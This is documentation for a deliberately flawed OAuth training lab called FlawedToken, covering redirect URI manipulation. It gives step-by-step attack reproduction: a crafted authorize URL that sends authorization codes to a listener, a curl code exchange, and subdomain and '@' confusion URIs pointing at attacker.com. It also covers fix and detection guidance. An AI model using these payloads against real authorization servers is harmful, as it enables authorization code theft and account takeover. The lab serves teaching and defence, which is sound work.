# Flaw 02 — Redirect URI Manipulation

**Variable:** `FLAW_REDIRECT_URI_VALIDATION`
**Default:** `on` (misconfiguration active)

---

## What This Flaw Is

During an OAuth authorization request, the client application specifies a
`redirect_uri` parameter — the URL where the authorization server should
send the user after they approve the request, along with the authorization code.

The authorization server is required to validate this URI strictly against a
pre-registered allow-list for that client. If validation is absent, overly
permissive, or relies on prefix matching instead of exact matching, an attacker
can manipulate the redirect destination and receive the authorization code
at a URI they control.

This flaw disables strict redirect URI validation on the authorization server.
Any URI is accepted, including open redirects, unregistered subdomains, and
paths not registered for the client.

---

## Why This Exists in Real Applications

- Developers register wildcard or prefix patterns for convenience during development
  and leave them in production
- Allow-list logic uses `startsWith` or prefix matching instead of exact string
  comparison
- Multi-tenant applications use dynamic redirect URIs without per-tenant validation
- OAuth libraries expose validation as a configurable option that defaults to lenient

---

## Reproducing the Attack Against FlawedToken

### Prerequisites

- FlawedToken running locally (`docker compose up`)
- `FLAW_REDIRECT_URI_VALIDATION=on` in your `.env`
- A listener to receive the redirected code (netcat, Burp Collaborator, or a
  local HTTP server)

### Attack 1 — Open Redirect to Attacker-Controlled URI

1. Start a listener on a port of your choice:
   ```bash
   python3 -m http.server 9000
   ```

2. Craft an authorization request with your listener as the redirect URI:
   ```
   http://localhost:8001/authorize?response_type=code&client_id=flawedtoken-client&redirect_uri=http://localhost:9000/capture&state=ATTACKSTATE
   ```

3. Open the URL in a browser and log in with any user from `users.json`

4. The auth server redirects the authorization code to your listener:
   ```
   GET /capture?code=AUTH_CODE_HERE&state=ATTACKSTATE
   ```

5. Exchange the code:
   ```bash
curl -X POST http://localhost:8001/token \
  -d "grant_type=authorization_code" \
  -d "code=AUTH_CODE_HERE" \
  -d "redirect_uri=http://localhost:9000/capture" \
  -d "client_id=flawedtoken-client"
   ```

### Attack 2 — Subdomain Confusion

If the registered redirect URI is `http://localhost:8000/callback`, test
whether the auth server accepts:

```
http://localhost.attacker.com:8000/callback
http://localhost:8000.attacker.com/callback
http://localhost:8000/callback@attacker.com
```

With this flaw active, the auth server accepts all of these.

---

## Fixed Behavior

Set `FLAW_REDIRECT_URI_VALIDATION=off` and restart:

```bash
docker compose down && docker compose up
```

With the flaw disabled, the authorization server performs exact string
comparison against the registered allow-list for the requesting client ID.
Any URI that does not exactly match a registered entry is rejected with
a `400 Bad Request` before the user is shown the consent screen.

---

## Detection Guidance

Signs of redirect URI manipulation in your logs:

- Authorization requests containing `redirect_uri` values not in the registered
  allow-list for that `client_id`
- Redirect URI values containing `@`, `//`, or URL-encoded characters in the
  host component
- Requests where the redirect URI domain does not match the registered client domain
- Multiple authorization requests in quick succession with varying redirect URIs
  from the same session (enumeration behavior)

---

## Debug Endpoint — Lab Only

FlawedToken ships a `/debug/flaws` endpoint on the auth server that exposes
active flaw state, pending code counts, and live token counts:

```
http://localhost:8001/debug/flaws
```

This endpoint exists to support attack walkthroughs and confirm flaw state
without reading environment variables directly. **It must not exist on any
production authorization server.** Exposing internal token counts, flaw
configuration, or server state to unauthenticated HTTP requests is itself a
misconfiguration — one that aids enumeration and reconnaissance. Any real AS
you build or configure should have no equivalent endpoint, or must gate it
behind authenticated admin access with rate limiting and audit logging.

---

## Further Reading

- [RFC 6749 §3.1.2 — Redirection Endpoint](https://datatracker.ietf.org/doc/html/rfc6749#section-3.1.2)
- [OAuth 2.0 Security Best Current Practice — redirect_uri](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics)
- cctbp.com — *Redirect URI Manipulation: The Allow-List That Wasn't* (link when published)
